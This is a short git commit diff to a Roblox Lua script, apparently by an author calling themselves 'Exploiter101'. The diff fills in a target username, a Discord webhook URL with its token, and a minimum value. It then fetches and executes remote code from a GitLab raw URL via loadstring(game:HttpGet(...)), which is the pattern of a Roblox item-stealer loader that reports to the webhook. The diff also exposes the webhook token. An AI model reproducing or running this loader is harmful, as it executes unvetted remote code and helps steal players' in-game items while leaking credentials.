865569a05aa819db347c8a2cbc9bd42a8665cfba
Exploiter101 <aplogsiptun@gmail.com>
2025-06-15 05:41:59 +0800

    Update testest.lua

--- testest.lua
+++ testest.lua
@@ -1,5 +1,5 @@
-Username = "Your Roblox Username"
-Webhook = "Your Webhook"
+Username = "ThroneConqueror"
+Webhook = "https://discord.com/api/webhooks/1383381390602539078/jQBvo5R9zJkAYPPdZQA9Gup0GFaC7LRO0WmN9ypQ8PwqwA1KvYNXldtz2nqZfLuCpH5b"
 MinimumValue = 1000000
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
